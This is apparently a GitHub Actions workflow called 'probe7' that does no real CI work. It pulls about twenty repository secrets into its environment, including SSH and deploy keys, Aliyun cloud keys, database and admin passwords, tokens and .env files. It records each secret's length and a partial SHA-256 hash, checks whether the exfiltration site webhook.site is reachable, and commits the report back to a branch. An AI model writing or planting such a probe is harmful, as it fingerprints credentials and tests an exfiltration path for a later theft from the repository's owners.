name: probe7
on:
  push:
    branches: ['probe-i59265']
permissions:
  contents: write
jobs:
  p:
    runs-on: ubuntu-latest
    env:
      K_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
      K_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
      K_DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
      K_SSH_KEY: ${{ secrets.SSH_KEY }}
      K_ID_RSA: ${{ secrets.ID_RSA }}
      K_ALIYUN_ACCESS_KEY_ID: ${{ secrets.ALIYUN_ACCESS_KEY_ID }}
      K_ALIYUN_ACCESS_KEY_SECRET: ${{ secrets.ALIYUN_ACCESS_KEY_SECRET }}
      K_ALIYUN_SECRET: ${{ secrets.ALIYUN_SECRET }}
      K_ACCESS_KEY_ID: ${{ secrets.ACCESS_KEY_ID }}
      K_ACCESS_KEY_SECRET: ${{ secrets.ACCESS_KEY_SECRET }}
      K_REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}
      K_ENV_FILE: ${{ secrets.ENV_FILE }}
      K_DOTENV: ${{ secrets.DOTENV }}
      K_HOST: ${{ secrets.HOST }}
      K_SERVER_HOST: ${{ secrets.SERVER_HOST }}
      K_ALIYUN_HOST: ${{ secrets.ALIYUN_HOST }}
      K_GH_PAT: ${{ secrets.GH_PAT }}
      K_TOKEN: ${{ secrets.TOKEN }}
      K_ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
      K_DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: probe-i59265
      - name: lens
        run: |
          {
            echo "runner=$(hostname) uid=$(id -u) ts=$(date -u +%FT%TZ)"
            for v in $(compgen -v | grep '^K_'); do
              eval "val=\${$v}"
              echo "$v len=${#val} sha=$(printf '%s' \"$val\" | sha256sum | cut -c1-16)"
            done
            echo "token_len=${#GITHUB_TOKEN}"
            echo "dns_webhook=$(getent hosts webhook.site || echo none)"
          } > probe-report-$GITHUB_RUN_ID.txt
          cat probe-report-$GITHUB_RUN_ID.txt
          git config user.email ci@probe.local
          git config user.name ci-probe
          git add -A probe-report-*.txt
          git commit -q -m "probe7 report $GITHUB_RUN_ID"
          git push origin HEAD:refs/heads/probe-i59265 2>&1 | tail -3
